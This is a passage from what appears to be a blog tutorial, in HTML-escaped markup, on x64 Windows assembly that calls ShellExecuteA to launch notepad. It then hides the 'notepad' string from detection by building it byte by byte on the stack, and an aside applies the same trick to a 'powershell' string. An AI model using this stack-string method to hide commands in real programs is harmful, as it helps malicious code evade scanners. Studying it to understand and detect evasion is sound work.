&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;ExitProcess&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Before we can call &lt;code&gt;ShellExecute&lt;/code&gt;, we first need to import the &lt;code&gt;ShellExecuteA&lt;/code&gt; symbol using &lt;code&gt;extern&lt;/code&gt;.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;segment&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;.text&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="na"&gt;...&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;extern&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;ExitProcess&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;extern&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;ShellExecuteA&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h3 id="aside-why-shellexecutea-and-not-shellexecute"&gt;Aside: Why ShellExecuteA and not ShellExecute?&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Because if you would look in the &lt;a href="https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea"&gt;MSDN documentation&lt;/a&gt;, you would find that there really isn't a &lt;code&gt;ShellExecute&lt;/code&gt; function available. There are &lt;code&gt;ShellExecuteA&lt;/code&gt; (For ANSI strings) and &lt;code&gt;ShellExecuteW&lt;/code&gt; (For Unicode strings), however. &lt;code&gt;ShellExecute&lt;/code&gt; is just a macro for these two functions. We can confirm this by looking at the &lt;code&gt;shellapi.h&lt;/code&gt; source code.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;#ifdef UNICODE&lt;/span&gt;
&lt;span class="cp"&gt;#define ShellExecute  ShellExecuteW&lt;/span&gt;
&lt;span class="cp"&gt;#else&lt;/span&gt;
&lt;span class="cp"&gt;#define ShellExecute  ShellExecuteA&lt;/span&gt;
&lt;span class="cp"&gt;#endif &lt;/span&gt;&lt;span class="c1"&gt;// !UNICODE&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;blockquote&gt;
&lt;p&gt;Since assembly does not use header files we can just call &lt;code&gt;ShellExecuteA&lt;/code&gt; or &lt;code&gt;ShellExecuteW&lt;/code&gt; directly. In this example, we won't be needing unicode support so we're going to be using the former.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;p&gt;Before we call the function in assembly, let's go back and take a look at how we did it in C.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;ShellExecute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;open&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;notepad&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SW_SHOW&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We have 5 paremeters to pass to the function. Here's how we can write this in assembly using the Microsoft &lt;a href="https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170"&gt;x64 calling conventions&lt;/a&gt;.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;0x5&lt;/span&gt;&lt;span class="w"&gt;              &lt;/span&gt;&lt;span class="c1"&gt;; nShowCmd ; SW_SHOW == 0x5&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;0x0&lt;/span&gt;&lt;span class="w"&gt;              &lt;/span&gt;&lt;span class="c1"&gt;; lpDirectory ; NULL == 0x0&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;r9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;r9&lt;/span&gt;&lt;span class="w"&gt;               &lt;/span&gt;&lt;span class="c1"&gt;; lpParameters ; Clear register == NULL&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;r8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;msg_notepad&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; lpFile&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;msg_open&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="c1"&gt;; lpOperation&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="w"&gt;             &lt;/span&gt;&lt;span class="c1"&gt;; hwnd&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;ShellExecuteA&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; Call function&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We then initialize the strings by adding a data segment section:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;segment&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;.data&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;msg_open&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;open&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;msg_notepad&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;notepad&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;For reference, here is our full code so far:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;bits&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;default&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rel&lt;/span&gt;

&lt;span class="nf"&gt;segment&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;.data&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;msg_open&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;open&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;msg_notepad&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;notepad&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;

&lt;span class="nf"&gt;segment&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;.text&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;global&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;main&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;extern&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;ExitProcess&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;extern&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;ShellExecuteA&lt;/span&gt;

&lt;span class="nl"&gt;main:&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;rbp&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;rbp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;0x5&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;0x0&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;r9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;r9&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;r8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;msg_notepad&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;msg_open&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;ShellExecuteA&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;ExitProcess&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Take note that this version of the code is still the one where the "notepad" string is detectable.&lt;/p&gt;
&lt;p&gt;To hide this string we need to apply the same solution we did to our C code; which is to place the data on the stack so that it would not be placed in the &lt;code&gt;.data&lt;/code&gt; segment.&lt;/p&gt;
&lt;p&gt;Here is how we did it in C:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ca_notepad&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;n&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;o&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;t&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;e&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;p&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;d&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;ShellExecute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;open&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ca_notepad&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SW_SHOW&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And here is how to do it in assembly:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="w"&gt;             &lt;/span&gt;&lt;span class="c1"&gt;; Reserve space on stack for string&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;byte&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;n&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;byte&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;o&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;byte&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;t&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;byte&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;e&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;byte&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;p&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;byte&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;a&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;byte&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;d&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;byte&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0x0&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;lea&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;r8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="c1"&gt;; Load address of string to r8&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="w"&gt;             &lt;/span&gt;&lt;span class="c1"&gt;; Reclaim space&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Here's a summary of the the above code:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Since our string is 8 characters long (Including the &lt;code&gt;0x0&lt;/code&gt; or &lt;code&gt;NULL&lt;/code&gt; terminator), we reserve space on the stack with &lt;code&gt;sub rsp, 8&lt;/code&gt;. &lt;/li&gt;
&lt;li&gt;Each character is then placed individually in the reserved space using &lt;code&gt;move byte&lt;/code&gt; while adding an offset to &lt;code&gt;rsp&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The address pointed to by &lt;code&gt;rsp&lt;/code&gt; is then loaded to the &lt;code&gt;r8&lt;/code&gt; register (This holds our 3nd parameter).&lt;/li&gt;
&lt;li&gt;We reclaim our reserved space using &lt;code&gt;add rsp, 8&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;After the code above, &lt;code&gt;r8&lt;/code&gt; would now point to the location in the stack where our string resides:&lt;/p&gt;

&lt;h3 id="aside-what-if-we-have-longer-strings"&gt;Aside: What if we have longer strings?&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;If we have a longer string like "powershell", then we need to reserve more space on the stack.
Take note, however that when reserving space we need to maintain the &lt;em&gt;stack alignment&lt;/em&gt; so we add and subtract by multiples of 8.
The "powershell" string has 11 characters so we use 16.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;byte&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;p&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;
